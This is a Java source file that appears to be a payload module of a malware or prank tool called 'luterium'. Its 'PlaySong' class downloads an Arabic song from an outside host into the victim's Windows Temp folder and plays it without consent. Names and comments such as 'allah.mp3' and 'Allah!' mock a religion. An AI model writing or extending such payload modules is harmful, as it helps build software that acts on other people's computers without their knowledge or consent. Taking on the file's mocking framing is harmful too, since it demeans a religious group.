package dev.peter.luterium.features.fun;

import dev.peter.luterium.payload.PayloadExecutor;
import dev.peter.luterium.utils.FileUtil;
import dev.peter.luterium.utils.Mp3Util;

import java.io.File;

/**
 * @author Peter
 * @since 10/25/2022
 * Allah!
 */

public class PlaySong implements PayloadExecutor {
    FileUtil fileUtil = new FileUtil();

    String allahUrl = "https://cs1.mp3.pm/download/188852973/a3NDMXpMNFlyTE0zbEJncG9BNmVNVTJ4amZyZVUwRTBZaEZ3dkg4TSt5MmdzSFBzMEJZV09UQmpUeldUcC9Hc2xHT29QV2d6VUxzcThUYk4wVWR3aFpxZFMrSmVZanQ0bHJDZ1M5UHVKUmJMWDd0OHZDSG83T1JuZzNNNDZ0cUE/Old_arabic_song_-_Ya_helwa_sabah_(mp3.pm).mp3"; //Not the best, but OK for now
    String allahPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\allah.mp3";

    @Override
    public void execute() throws Exception {
        fileUtil.downloadFile(allahUrl, (new File(allahPath)));

        Mp3Util mp3Util = new Mp3Util(allahPath);
        mp3Util.play();
    }
}
